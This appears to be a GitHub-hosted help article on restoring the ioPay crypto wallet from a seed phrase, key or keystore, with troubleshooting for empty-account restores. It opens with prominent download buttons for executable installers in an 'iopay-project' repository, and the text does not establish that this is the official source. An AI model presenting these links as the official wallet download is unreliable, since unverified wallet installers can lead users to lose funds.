![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Restoring ioPay Wallet From a Seed Phrase

Yes - ioPay Wallet restores from **either a 12-word or a 24-word phrase**. Import accepts a phrase, a private key or a keystore file, so a wallet backed up in any of those three forms can come back.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

The part that goes wrong is rarely the import. It is either restoring into the wrong build, or restoring something that was never a phrase.

## Before you import

- **Use the current build.** Install or update to **v2.0.2** first ([update guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md)). Restoring into an older build risks importing into an app that behaves differently from the one the account was created in.
- **Have the phrase in front of you, in order.** If it is on paper, do not retype it from memory or from a photograph.
- **Know your expected addresses.** If you have a record of the `io1...` or `0x...` address, you can confirm the restore is the right account before you do anything else.

## Restore

1. **Open the app and choose import** rather than "create new".
2. **Choose the artifact you actually have** - phrase, private key or keystore file. This is the step where people fail: a 12-word phrase is not a private key, and a keystore file needs its password.
3. **Enter the phrase in order**, words separated by single spaces, no numbering, no punctuation. If the app rejects it, check the word list carefully - one transposed word looks identical at a glance.
4. **Name the account** so you can tell it apart if you hold several.
5. **Confirm both addresses** - `io1...` and `0x...` - match what you expected for that account. They are two representations of the same key, and both should be present.
6. **Check the balances and any staking positions** before you send anything. A restored staking position is still staked: it will not appear as a spendable balance.

## When it restores to an empty account

This is the case worth taking slowly, because the instinct - "the restore failed, try another phrase" - makes it worse.

**A phrase from a different wallet.** Phrases are not universal. A phrase generated by another application may derive a different account, or derive nothing on IoTeX. Import the artifact that wallet gave you, not a phrase you found in its menus.

**A private key or keystore, mistaken for a phrase.** If the earlier desktop client created the account, its backup is a **private key or a keystore file** - that client shipped a phrase at one point and then stopped generating one. Import the key or the keystore, with its password.

**An extra passphrase.** If the wallet that created the account used an additional passphrase on top of the words, the phrase alone restores a different (usually empty) account. The phrase is correct; it is incomplete. This build's documentation does not describe that setup, so if you used one, restore in the wallet that created it.

**A different account in the same phrase.** One phrase can hold several accounts. If the first account is empty, check whether the wallet exposes additional accounts derived from the same phrase before concluding anything is lost.

## After the restore

- **Re-test the backup** - if you restored from your only copy, make a second copy now. [Backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).
- **Do not re-stake immediately** if positions came back. Confirm they appear with the right validator and duration first.
- **Do not send a test amount to an address you have not confirmed** in the restored wallet.

## What no one can do for you

There is no recovery service, no support desk that can reverse a transaction, and no way to regenerate a phrase from an empty device. If someone offers to recover your wallet for a fee, they are asking for your phrase, which is the theft itself.

If the account is genuinely gone - no phrase, no key, no keystore, no unlocked device - it is gone. That is the honest end of this page, and it is why the backup article exists.

## Related

- [How to back up your ioPay seed phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md)
- [What ioPay Wallet is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/what-is-iopay-wallet.md)
- [Updating ioPay Wallet to the current release](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md)

## The order that avoids a second loss

Most restore failures are sequencing failures. Do these five things in this order and the account is either back or provably not going to come back from what you hold:

1. **Update first.** Restoring into an old build risks an account that behaves differently from the one the phrase was created in.
2. **Restore into a fresh install**, not over a working account - an empty app makes it obvious whether the import produced anything.
3. **Compare addresses before balances.** An address match proves the right account; a balance match only proves something arrived.
4. **Check positions separately.** A bucket is not a balance, and a stake that is still locked looks like an absence to anyone expecting spendable IOTX.
5. **Write a second copy of the phrase** before you use the account, because the copy you just proved is now the only thing standing between you and the same problem again.

## A restore that worked but looks wrong

Three things surprise people after a successful restore, and none of them is a fault. History can be short or absent on a fresh install while balances are correct, because the app reads what it has fetched rather than an archive. Accrued rewards show against the staking position rather than in the spendable figure. And the account may be one of several the phrase can derive, so an empty first account is worth a second look at the account list before any conclusion.


---

*Import methods reflect the v2.0.2 build. The earlier client's key/keystore backup model comes from its release history; this page does not describe that client's status, only its backup format.*
